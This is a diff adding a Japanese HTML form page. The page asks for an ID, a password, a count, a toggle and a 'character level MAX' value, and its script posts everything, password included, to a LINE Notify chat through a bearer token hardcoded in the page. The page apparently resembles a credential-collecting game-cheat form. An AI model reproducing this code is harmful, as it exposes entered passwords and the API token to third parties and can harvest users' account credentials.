@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>フォーム</title>
+</head>
+
+<body>
+
+  <form id="myForm">
+    <label for="input1">1の入力欄:</label>
+    <input type="text" id="input1" name="input1" required><br>
+
+    <label for="input2">2の入力欄（パスワード）:</label>
+    <input type="password" id="input2" name="input2" required><br>
+
+    <label for="count">3の個数:</label>
+    <input type="number" id="count" name="count" required><br>
+
+    <label for="toggle">4のチェックマーク型のON/OFF（TESTをON/OFF）:</label>
+    <input type="checkbox" id="toggle" name="toggle"><br>
+
+    <label for="level">5のキャラレベルMAX:</label>
+    <input type="number" id="level" name="level" required><br>
+
+    <button type="button" onclick="submitForm()">送信</button>
+  </form>
+
+  <script>
+    function submitForm() {
+      // フォームデータの取得
+      const formData = new FormData(document.getElementById('myForm'));
+
+      // Line Notifyのトークン
+      const lineNotifyToken = 'LPZHvcyYjfikycVpo8dGuQgrZJ0G1GpH4lpAEx3RiFy';
+
+      // Line Notify APIのURL
+      const apiUrl = 'https://notify-api.line.me/api/notify';
+
+      // フォームデータをLine Notifyに送信
+      fetch(apiUrl, {
+        method: 'POST',
+        headers: {
+          'Authorization': `Bearer ${lineNotifyToken}`
+        },
+        body: formData
+      })
+        .then(response => {
+          if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+          }
+          return response.json();
+        })
+        .then(data => {
+          alert('フォームデータが正常に送信されました。');
+          console.log('Line Notifyのレスポンス:', data);
+        })
+        .catch(error => {
+          console.error('エラー:', error);
+          alert('エラーが発生しました。もう一度試してください。');
+        });
+    }
+  </script>
+
+</body>
+
+</html>
